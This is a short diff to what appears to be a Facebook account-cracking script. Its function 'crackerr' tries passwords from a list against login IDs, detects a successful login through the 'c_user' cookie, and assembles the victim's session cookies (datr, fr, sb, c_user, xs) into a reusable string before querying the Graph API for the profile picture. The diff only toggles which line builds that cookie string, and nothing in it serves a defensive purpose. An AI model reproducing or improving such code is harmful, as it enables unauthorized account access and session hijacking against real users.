@@ -522,8 +522,8 @@ def crackerr(ids,passlist):
             response = session.post(url,data=log_data,headers=headers,allow_redirects=False)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
-                #kuki = convert(session.cookies.get_dict())
-                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
+                kuki = convert(session.cookies.get_dict())
+                #kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 user = re.findall('c_user=(.*);xs', kuki)[0]
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
